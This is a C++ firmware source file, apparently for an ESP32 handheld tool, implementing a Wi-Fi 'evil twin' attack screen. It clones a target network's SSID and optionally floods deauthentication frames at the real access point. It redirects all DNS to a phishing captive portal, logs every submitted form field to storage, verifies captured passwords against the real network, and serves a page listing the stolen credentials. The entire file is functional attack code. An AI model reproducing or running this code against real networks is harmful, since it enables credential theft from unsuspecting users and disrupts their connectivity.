#include "WifiEvilTwinScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "screens/wifi/WifiMenuScreen.h"
#include "utils/WifiAttackUtil.h"
#include "ui/actions/ShowStatusAction.h"

#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>

// ── Destructor ──────────────────────────────────────────────────────────────

WifiEvilTwinScreen::~WifiEvilTwinScreen()
{
  _stopAttack();
}

// ── Lifecycle ───────────────────────────────────────────────────────────────

void WifiEvilTwinScreen::onInit()
{
  _showMenu();
}

void WifiEvilTwinScreen::onItemSelected(uint8_t index)
{
  if (_state == STATE_MENU) {
    switch (index) {
      case 0: _selectWifi();    break;
      case 1:
        _deauth = !_deauth;
        _deauthSub = _deauth ? "On" : "Off";
        _menuItems[1].sublabel = _deauthSub.c_str();
        render();
        break;
      case 2:
        _checkPwd = !_checkPwd;
        _checkPwdSub = _checkPwd ? "On" : "Off";
        _menuItems[2].sublabel = _checkPwdSub.c_str();
        render();
        break;
      case 3: _selectPortal();  break;
      case 4: _startAttack();   break;
    }
  } else if (_state == STATE_SELECT_WIFI && index < _scanCount) {
    _target.ssid    = WiFi.SSID(index);
    _target.channel = WiFi.channel(index);
    sscanf(_scanValues[index], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &_target.bssid[0], &_target.bssid[1], &_target.bssid[2],
           &_target.bssid[3], &_target.bssid[4], &_target.bssid[5]);
    _showMenu();
  } else if (_state == STATE_SELECT_PORTAL && index < _portalCount) {
    _portalFolder = _portalNames[index];
    _showMenu();
  }
}

void WifiEvilTwinScreen::onUpdate()
{
  if (_state != STATE_RUNNING) {
    ListScreen::onUpdate();
    return;
  }

  // Handle exit
  if (Uni.Nav->wasPressed()) {
    const auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
      _stopAttack();
      _showMenu();
      return;
    }
  }

  // DNS
  if (_dns) _dns->processNextRequest();

  // Check queued password (must run on main loop, not async context)
  if (_pendingPwd.length() > 0) {
    String pwd = _pendingPwd;
    _pendingPwd = "";
    _tryPassword(pwd);
  }

  // Deauth
  if (_deauth && _attacker && millis() - _lastDeauth > 100) {
    _attacker->deauthenticate(_target.bssid, _target.channel);
    _lastDeauth = millis();
  }

  // Redraw
  if (millis() - _lastDraw > 500) {
    _drawLog();
    _lastDraw = millis();
  }
}

void WifiEvilTwinScreen::onBack()
{
  if (_state == STATE_SELECT_WIFI || _state == STATE_SELECT_PORTAL) {
    _showMenu();
  } else if (_state == STATE_RUNNING) {
    _stopAttack();
    _showMenu();
  } else {
    Screen.setScreen(new WifiMenuScreen());
  }
}

// ── Menu ────────────────────────────────────────────────────────────────────

void WifiEvilTwinScreen::_showMenu()
{
  _state = STATE_MENU;
  _networkSub = _target.ssid;
  _deauthSub   = _deauth ? "On" : "Off";
  _checkPwdSub = _checkPwd ? "On" : "Off";
  _portalSub   = _portalFolder.isEmpty() ? "-" : _portalFolder;

  _menuItems[0] = {"Network",        _networkSub.c_str()};
  _menuItems[1] = {"Deauth",         _deauthSub.c_str()};
  _menuItems[2] = {"Check Password", _checkPwdSub.c_str()};
  _menuItems[3] = {"Portal",         _portalSub.c_str()};
  _menuItems[4] = {"Start"};
  setItems(_menuItems, 5);
}

// ── WiFi Scan ───────────────────────────────────────────────────────────────

void WifiEvilTwinScreen::_selectWifi()
{
  _state = STATE_SELECT_WIFI;
  ShowStatusAction::show("Scanning...", 0);

  WiFi.mode(WIFI_STA);
  const int total = WiFi.scanNetworks();

  if (total == 0) {
    ShowStatusAction::show("No networks found");
    _showMenu();
    return;
  }

  _scanCount = total > MAX_SCAN ? MAX_SCAN : total;
  for (int i = 0; i < _scanCount; i++) {
    snprintf(_scanLabels[i], sizeof(_scanLabels[i]), "[%2d] %s",
             WiFi.channel(i), WiFi.SSID(i).c_str());
    snprintf(_scanValues[i], sizeof(_scanValues[i]), "%s",
             WiFi.BSSIDstr(i).c_str());
    _scanItems[i] = {_scanLabels[i], _scanValues[i]};
  }

  setItems(_scanItems, _scanCount);
}

// ── Portal Selection ────────────────────────────────────────────────────────

void WifiEvilTwinScreen::_selectPortal()
{
  _state = STATE_SELECT_PORTAL;

  if (!Uni.Storage || !Uni.Storage->isAvailable()) {
    ShowStatusAction::show("No storage available");
    _showMenu();
    return;
  }

  IStorage::DirEntry entries[MAX_PORTALS];
  uint8_t count = Uni.Storage->listDir("/unigeek/wifi/portals", entries, MAX_PORTALS);

  _portalCount = 0;
  for (int i = 0; i < count && _portalCount < MAX_PORTALS; i++) {
    if (entries[i].isDir) {
      _portalNames[_portalCount] = entries[i].name;
      _portalItems[_portalCount] = {_portalNames[_portalCount].c_str()};
      _portalCount++;
    }
  }

  if (_portalCount == 0) {
    ShowStatusAction::show("No portals found\nWiFi > Network > Download\n> Firmware Sample Files");
    _showMenu();
    return;
  }

  setItems(_portalItems, _portalCount);
}

// ── Try Password (auto-verify during attack) ───────────────────────────────

bool WifiEvilTwinScreen::_tryPassword(const String& password)
{
  _addLog("[*] Checking password...");

  // Temporarily connect as STA to verify
  WiFi.begin(_target.ssid.c_str(), password.c_str());

  unsigned long start = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - start < 10000) {
    delay(100);
  }

  bool ok = WiFi.status() == WL_CONNECTED;
  WiFi.disconnect(false);

  if (ok) {
    _pwdResult = 1;
    if (Uni.Speaker) Uni.Speaker->playWin();
    _addLog("[+] Password correct!");
  } else {
    _pwdResult = -1;
    if (Uni.Speaker) Uni.Speaker->playWrongAnswer();
    _addLog("[!] Password wrong");
  }

  return ok;
}

// ── Portal HTML ─────────────────────────────────────────────────────────────

void WifiEvilTwinScreen::_loadPortalHtml()
{
  _portalBasePath = "";
  if (!_portalFolder.isEmpty() && Uni.Storage && Uni.Storage->isAvailable()) {
    _portalBasePath = "/unigeek/wifi/portals/" + _portalFolder;
    String path = _portalBasePath + "/index.htm";
    if (Uni.Storage->exists(path.c_str())) {
      _portalHtml = Uni.Storage->readFile(path.c_str());
      String successPath = _portalBasePath + "/success.htm";
      if (Uni.Storage->exists(successPath.c_str())) {
        _successHtml = Uni.Storage->readFile(successPath.c_str());
      } else {
        _successHtml = "<html><body><h2>Connected!</h2></body></html>";
      }
      return;
    }
  }
  _portalBasePath = "";
  _portalHtml  = "";
  _successHtml = "";
}

// ── Start / Stop Attack ─────────────────────────────────────────────────────

void WifiEvilTwinScreen::_startAttack()
{
  const MacAddr blank = {0, 0, 0, 0, 0, 0};
  if (_target.ssid == "-" && memcmp(_target.bssid, blank, 6) == 0) {
    ShowStatusAction::show("Select a network first!");
    return;
  }
  if (_portalFolder.isEmpty()) {
    ShowStatusAction::show("Select a portal first!");
    return;
  }

  _state     = STATE_RUNNING;
  _logCount  = 0;
  _pwdCount  = 0;
  _lastDraw  = 0;
  _lastDeauth = 0;

  _loadPortalHtml();

  // Init attacker without its own AP — we manage softAP ourselves
  if (_deauth) {
    _attacker = new WifiAttackUtil(false);
    _addLog("Deauth enabled");
  } else {
    WiFi.mode(WIFI_AP_STA);
  }

  // Create soft AP cloning the target SSID
  WiFi.softAP(_target.ssid.c_str(), NULL, _target.channel, 0, 4);
  delay(100);
  IPAddress apIP = WiFi.softAPIP();

  _addLog("AP started");

  // DNS server — redirect all to AP IP
  _dns = new DNSServer();
  _dns->start(53, "*", apIP);
  _addLog("DNS started");

  // Web server
  _server = new AsyncWebServer(80);

  // Serve portal (also handles captive portal detection URLs via onNotFound redirect)
  auto servePortalSilent = [this](AsyncWebServerRequest* req) {
    req->send(200, "text/html", _portalHtml);
  };

  _server->on("/", HTTP_GET, [this](AsyncWebServerRequest* req) {
    _addLog("[+] Portal visited");
    req->send(200, "text/html", _portalHtml);
  });
  _server->on("/generate_204", HTTP_GET, servePortalSilent);
  _server->on("/fwlink", HTTP_GET, servePortalSilent);
  _server->on("/hotspot-detect.html", HTTP_GET, servePortalSilent);
  _server->on("/connecttest.txt", HTTP_GET, servePortalSilent);

  // Handle POST — save all form data
  _server->on("/", HTTP_POST, [this](AsyncWebServerRequest* req) {
    String data;
    String pwd;
    for (int i = 0; i < (int)req->params(); i++) {
      const AsyncWebParameter* p = req->getParam(i);
      if (!p->isPost()) continue;
      if (data.length() > 0) data += "\n";
      data += p->name() + "=" + p->value();
      if (p->name() == "password") pwd = p->value();
    }
    _saveCaptured(data);
    if (_checkPwd && pwd.length() > 0) {
      char logBuf[60];
      snprintf(logBuf, sizeof(logBuf), "[+] Pwd: %s", pwd.c_str());
      _addLog(logBuf);

      _pendingPwd = pwd;
      _pwdResult = 0;  // pending
      // Serve a "connecting" page that polls /status
      req->send(200, "text/html",
        "<html><head><meta name=\"viewport\" content=\"width=device-width\">"
        "<style>body{font-family:sans-serif;text-align:center;margin:40px auto;max-width:350px}"
        ".dots::after{content:'';animation:d 1.5s steps(4) infinite}"
        "@keyframes d{0%{content:''}25%{content:'.'}50%{content:'..'}75%{content:'...'}}"
        "</style></head><body>"
        "<h2>Connecting<span class=\"dots\"></span></h2>"
        "<p id=\"msg\">Verifying credentials...</p>"
        "<script>"
        "setInterval(function(){"
        "fetch('/status').then(r=>r.text()).then(s=>{"
        "if(s==='ok'){document.getElementById('msg').textContent='Connected!';setTimeout(()=>location='/',2000)}"
        "else if(s==='fail'){document.getElementById('msg').textContent='Incorrect password';setTimeout(()=>location='/',2000)}"
        "})},2000);"
        "</script></body></html>");
    } else {
      req->send(200, "text/html", _successHtml);
    }
  });

  // Catch-all: serve static files from portal folder, or redirect to portal
  _server->onNotFound([](AsyncWebServerRequest* req) {
    req->redirect("/");
  });

  // Serve static files from storage
  if (Uni.Storage && Uni.Storage->isAvailable()) {
    if (!_portalBasePath.isEmpty()) {
      _server->serveStatic("/", Uni.Storage->getFS(), _portalBasePath.c_str());
    }
    _server->serveStatic("/captives/", Uni.Storage->getFS(), "/unigeek/wifi/captives/");
  }

  // Captives index page
  _server->on("/captives", HTTP_GET, [this](AsyncWebServerRequest* req) {
    if (!Uni.Storage || !Uni.Storage->isAvailable()) {
      req->send(200, "text/html", "<html><body><h3>No storage</h3></body></html>");
      return;
    }
    IStorage::DirEntry entries[20];
    uint8_t count = Uni.Storage->listDir("/unigeek/wifi/captives", entries, 20);
    String html = "<html><head><meta name=\"viewport\" content=\"width=device-width\">"
                  "<style>body{font-family:sans-serif;margin:20px}a{display:block;padding:6px 0}</style>"
                  "</head><body><h3>Captured Credentials</h3>";
    int found = 0;
    for (int i = 0; i < count; i++) {
      if (entries[i].isDir) continue;
      html += "<a href=\"/captives/" + String(entries[i].name) + "\">" + String(entries[i].name) + "</a>";
      found++;
    }
    if (found == 0) html += "<p>No captures yet.</p>";
    html += "</body></html>";
    req->send(200, "text/html", html);
  });

  // Status endpoint for async password check polling
  _server->on("/status", HTTP_GET, [this](AsyncWebServerRequest* req) {
    if (_pwdResult == 1)       req->send(200, "text/plain", "ok");
    else if (_pwdResult == -1) req->send(200, "text/plain", "fail");
    else                       req->send(200, "text/plain", "pending");
  });

  _server->begin();
  _addLog("Web server started");
  _addLog("BACK/Press to stop");

  _drawLog();
}

void WifiEvilTwinScreen::_stopAttack()
{
  if (_server) {
    _server->end();
    delete _server;
    _server = nullptr;
  }
  if (_dns) {
    _dns->stop();
    delete _dns;
    _dns = nullptr;
  }
  if (_attacker) {
    delete _attacker;
    _attacker = nullptr;
  }
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);

  _logCount    = 0;
  _pwdCount    = 0;
  _lastDeauth  = 0;
  _lastDraw    = 0;
  _pendingPwd  = "";
  _pwdResult   = 0;
  _portalHtml  = "";
  _successHtml = "";
  _portalBasePath = "";
}

// ── Credential Capture ──────────────────────────────────────────────────────

void WifiEvilTwinScreen::_saveCaptured(const String& data)
{
  _pwdCount++;
  _addLog("[+] Credential received");

  if (!_checkPwd && Uni.Speaker) Uni.Speaker->playNotification();

  if (!Uni.Storage || !Uni.Storage->isAvailable()) return;

  Uni.Storage->makeDir("/unigeek/wifi/captives");

  char bssidStr[18];
  snprintf(bssidStr, sizeof(bssidStr), "%02X%02X%02X%02X%02X%02X",
           _target.bssid[0], _target.bssid[1], _target.bssid[2],
           _target.bssid[3], _target.bssid[4], _target.bssid[5]);

  String filename = "/unigeek/wifi/captives/" + String(bssidStr) + "_" + _target.ssid + ".txt";

  fs::File f = Uni.Storage->open(filename.c_str(), FILE_APPEND);
  if (f) {
    f.println("---");
    f.println(data);
    f.close();
  }
}

// ── Log Display ─────────────────────────────────────────────────────────────

void WifiEvilTwinScreen::_addLog(const char* msg)
{
  if (_logCount < MAX_LOG) {
    strncpy(_logLines[_logCount], msg, 59);
    _logLines[_logCount][59] = '\0';
    _logCount++;
  } else {
    // Shift up
    for (int i = 0; i < MAX_LOG - 1; i++) {
      memcpy(_logLines[i], _logLines[i + 1], 60);
    }
    strncpy(_logLines[MAX_LOG - 1], msg, 59);
    _logLines[MAX_LOG - 1][59] = '\0';
  }
}

void WifiEvilTwinScreen::_drawLog()
{
  TFT_eSprite sp(&Uni.Lcd);
  sp.createSprite(bodyW(), bodyH());
  sp.fillSprite(TFT_BLACK);

  // Log lines (top area, above status bar)
  int lineH    = 10;
  int statusH  = 14;
  int logAreaH = bodyH() - statusH;
  int maxVisible = logAreaH / lineH;
  int startIdx   = _logCount > maxVisible ? _logCount - maxVisible : 0;

  sp.setTextDatum(TL_DATUM);
  sp.setTextColor(TFT_WHITE, TFT_BLACK);
  for (int i = startIdx; i < _logCount; i++) {
    int y = (i - startIdx) * lineH;
    sp.drawString(_logLines[i], 2, y, 1);
  }

  // Separator
  int sepY = bodyH() - statusH;
  sp.drawFastHLine(0, sepY, bodyW(), TFT_DARKGREY);

  // Status bar at bottom — left: password count, right: SSID
  int barY = sepY + 2;
  sp.setTextColor(TFT_GREEN, TFT_BLACK);
  sp.setTextDatum(TL_DATUM);

  char pwdLabel[16];
  snprintf(pwdLabel, sizeof(pwdLabel), "Pwd: %d", _pwdCount);
  sp.drawString(pwdLabel, 2, barY, 1);

  sp.setTextDatum(TR_DATUM);
  sp.drawString(_target.ssid.substring(0, 16), bodyW() - 2, barY, 1);

  sp.pushSprite(bodyX(), bodyY());
  sp.deleteSprite();
}
